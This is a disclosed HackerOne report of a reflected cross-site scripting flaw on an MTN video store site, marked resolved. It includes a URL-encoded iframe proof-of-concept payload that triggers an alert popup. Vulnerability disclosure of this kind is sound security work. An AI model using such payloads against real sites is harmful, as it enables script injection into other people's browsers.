---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1646248'
original_report_id: '1646248'
title: Reflected xss on videostore.mtnonline.com
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: mtn_group
created_at: '2022-07-22T11:03:04.098Z'
disclosed_at: '2022-09-25T19:10:11.387Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 9
asset_identifier: mtnonline.com
asset_type: URL
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# Reflected xss on videostore.mtnonline.com

## Metadata

- HackerOne Report ID: 1646248
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: mtn_group
- Disclosed At: 2022-09-25T19:10:11.387Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

## Summary:
Hi,
I found reflected xss vuln on videostore.mtnonline.com

## Steps To Reproduce:
  1. Open browser
  2. Go to ``https://videostore.mtnonline.com/GL/Default.aspx?PId=126&CId=5&OprId=11&Ctg=OF25MTNNGVS_LapsInTime%22%27testxxx%3E%3Ciframe%20src=%22data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E%22%3E%3C/iframe%3E`` url
 3. Browser show alert popup

## Impact

We can run javascript code

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
